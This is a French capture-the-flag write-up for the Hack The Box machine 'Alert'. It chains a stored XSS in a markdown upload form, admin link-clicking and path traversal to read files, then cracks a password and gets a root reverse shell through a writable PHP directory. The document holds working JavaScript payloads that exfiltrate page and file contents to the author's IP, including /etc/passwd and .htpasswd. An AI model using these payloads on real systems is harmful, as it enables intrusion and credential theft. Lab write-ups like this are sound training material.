---
title: Machine - alert
---

## Machine
+ URL : [Linkvortex](https://app.hackthebox.com/machines/linkvortex)
+ Difficulté : easy

## Enumeration
On utilise nmap pour lister le nombre de ports TCP ouverts : `nmap <IP>`. Il y a 2 ports ouverts (80 et 22).

Un serveur web écoute sur le port 80. En se rendant sur `http://<IP>`, on est redirigé vers `http://alert.htb`.

On utilise `gobuster` pour chercher si d'autres vhost existent. On trouve que le vhost `statistics.alert.htb` existe, mais nous n'avons pas le droit d'y acceder. Une popup demandant un couple login/password protège la page.

## Analyse de alert.htb

Voici la page d'accueil du site.

{{ image(url="homepage.png", no_hover=true) }}

Il s'agit d'un formulaire qui permet d'envoyer un fichier markdown, le serveur s'occupe ensuite de convertir le markdown en html et nous renvoie le resultat. Il nous fourni aussi un lien pour partager le resultat.

En lançant une recherche de répértoire avec `dirsearch -u http://alert.htb` on trouve les pages suivantes.

{{ image(url="dirsearch.png", no_hover=true) }}

On y voit plusieurs pages dont nous n'avions pas connaissance : `/messages`, `/messages.php` et `/uploads`. Les pages `/messages` et `/uploads` renvoie vers des 403. La page `/message.php` vers une page vide. On laisse ça de coté pour le moment.

### XSS via le formulaire d'upload

En uploadant un fichier markdown avec comme contenu :

```md
<script>
alert('XSS :)')
</script>
```

Le serveur nous renvoie cette page :

{{ image(url="xss_poc.png", no_hover=true) }}

Nous savons donc qu'il est possible d'injecter du javascript dans le markdown et qu'il sera présent aussi après conversion. Cependant, pour que ça serve à quelque chose il faut que ce code javascript soit executé sur la machine de quelqu'un d'autre que la notre (un admin du site par exemple...)

### Page de contact

Dans la page `about` du site on peut lire `"If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours"`.

Nous pouvons donc tenter de faire ouvrir cette page infecter à l'administrateur en utilisant la page de contact.

{{ image(url="contact_page.png", no_hover=true) }}

Pour cela nous pouvons envoyer le lien de partage de notre document à l'admin via la page de contact, en esperant qu'il l'ouvre. Il nous faut donc un moyen de prouver qu'il a bien ouvert notre lien.

Pour verifier que l'admin ouvre notre lien, on peut utiliser la commande `fetch` dans notre payload javascript, qui sert à requeter une URL. En requetant une URL dont on peut superviser l'accès on saura si l'administrateur a cliqué sur le lien.

On peut faire tourner un serveur http en python (`python3 -m http.server`) et donner l'URL de ce serveur.

Voici le payload utilisé dans le markdown.

```md
<script>
fetch('http://<MYIP>:5000');
</script>
```

Il nous faut donc envoyer ce payload via la page d'upload (`http://alert.htb?page=alert`). Récupérer le lien de partage, envoyer ce lien via le formulaire de contact puis attendre de voir si notre lien est requeté.

{{ image(url="mail_contact.png", no_hover=true) }}

{{ image(url="pingback.png", no_hover=true) }}

On peut voir que notre serveur a bien été requeté. On sait donc que notre lien a été ouvert.

### Enumération via XSS

Il nous faut maintenant trouvé un moyen d'exploiter cette XSS.

Pendant l'énumération de pages sur le site au début de ce rapport, nous avions trouvé les pages `/messages`, `/uploads` et `/messages.php`. Nous allons faire ouvrir ces pages par l'admin puis lui faire nous renvoyer le contenu pour voir si ce qu'il voit est different de ce que nous voyons.

Pour ça on utilise le payload suivant dans le markdown. Avec `<PATH>` la page que l'on souhaite récupérer. Ce script va requeter la page voulue, puis requeter notre serveur avec comme paramètre d'URL le contenu de la page en question. Puisque nous controllons notre serveur il est simple de récupérer ce paramètre.

```md
<script>
fetch("http://alert.htb/<PATH>")  <---- REQUETE LA PAGE VOULUE
.then(response => response.text())
.then(data => {
    fetch("http://10.10.14.60:8000/?file_content=" + encodeURIComponent(data)); <---- RENVOIE LE CONTENU
   });
</script>
```

Voici les résultats que l'on obtient :

+ page `/messages` : une 403 comme quand nous faisions la requete nous même
+ page `/uploads` : une 403 comme quand nous faisions la requete nous même
+ page `/messages.php` : une page dont le contenu est le suivant

```html
<h1>Messages</h1>
<ul>
    <li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li>
</ul>
```

La page contient une liste avec des dates et des liens. On voit que la page `/messages.php` accepte un paramètre d'url `file` avec un nom de fichier. Essayons d'en abuser pour lire des fichiers du système.

On utilisera le payload suivant :

```md
<script>
fetch("http://alert.htb/messages.php?file=../../../../../etc/passwd")  <---- REQUETE LA PAGE VOULUE
.then(response => response.text())
.then(data => {
    fetch("http://10.10.14.60:8000/?file_content=" + encodeURIComponent(data)); <---- RENVOIE LE CONTENU
   });
</script>
```

On obtient le resultat suivant :

{{ image(url="passwd.png", no_hover=true) }}

Il s'agit du fichier `/etc/passwd` encodé comme paramètre de notre URL. Nous pouvons donc lire des fichiers du système via cette vulnérabilité.

La façon de faire étant assez laborieuse (générer le payload, envoyer le markdown, récupérer le lien, l'envoyer via le formulaire puis décoder le paramètre). J'ai rapidement developper 2 scripts python qui permettent d'automatiser le processus. Les voici [server](explorer_server.py) et [client](explorer_client.py).

Le premier script est un serveur [Flask](https://flask.palletsprojects.com/en/stable/) qui automatise le processus puis ajoute le contenu du fichier demandé dans une variable. Le second est un simple script qui va requeter le serveur avec un nom de fichier a lire.

En utilisant ces deux scripts, nous pouvons commencer à explorer et à chercher du contenu qui pourrait nous interesser.

Au début de ce rapport en énumérant nous avons trouver l'url `statistics.alert.htb` qui était inaccessible car protégé par le serveur web. Nous allons chercher le fichier `.htpasswd` qui nous permettrait de connaitre les identifiants pour y acceder. On le trouve en utilisant le chemin `../../../../var/www/statistics.alert.htb/.htpasswd`.

{{ image(url="htpasswd.png", no_hover=true) }}

## Accès au serveur
### Flag user

On peut trouver le mot de passe en clair d'Albert en utilisant la commande `hashcat -m 1600 -a 0 hash.txt rockyou.txt`.

Le mot de passe trouvé est `manchesterunited`. Comme souvent dans les machines HackTheBox, ce mot de passe est aussi celui d'albert pour l'accès SSH.

On a donc accès à la machine en SSH et on récupère le flag user.

{{ image(url="user_logged.png", no_hover=true) }}

### Flag root

En faisant `id` en tant que l'utilisateur albert, on voit qu'il appartient au groupe `management`.

On peut lister les fichiers dont le groupe est `management` pour voir à quoi l'on a accès via ce groupe.

```sh
albert@alert:~$ find / -group management 2>/dev/null
/opt/website-monitor/config
/opt/website-monitor/config/configuration.php
albert@alert:~$ ls -la /opt/website-monitor/config
total 12
drwxrwxr-x 2 root management 4096 Jan 22 10:56 .
drwxrwxr-x 7 root root       4096 Oct 12 01:07 ..
-rwxrwxr-x 1 root management   49 Jan 22 10:56 configuration.php
```

Le user `albert` (via son appartenance au groupe `management`) peut donc écrire des fichiers dans le dossier `/opt/website-monitor/config`.

On va lister les processus pour voir si on peut trouver une mention de ce dossier.

```sh
albert@alert:~$ ps aux | grep monitor
root         988  0.0  0.6 207156 26580 ?        Ss   04:01   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor <---- POINT D'ENTREE !!
root        1040  0.0  0.0   2636   720 ?        S    04:01   0:00 inotifywait -m -e modify --format %w%f %e /opt/website-monitor/config
root       11612  0.0  0.2 207156 10428 ?        Ss   10:53   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
root       11703  0.0  0.2 207156  8096 ?        Ss   10:54   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
albert     12219  0.0  0.0   8160  2404 pts/0    S+   10:58   0:00 grep --color=auto monitor
```

On voit que le dossier `/opt/website-monitor` est utilisé comme repertoire source pour un serveur PHP, et que ce processus tourne en tant que root.

Il nous suffit donc de placer un fichier `.php` nous permettant d'obtenir un reverse shell (par exemple celui de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)) dans le dossier `/opt/website-monitor/config`, et nous aurons accès en tant que root à la machine.

{{ image(url="root_flag.png", no_hover=true) }}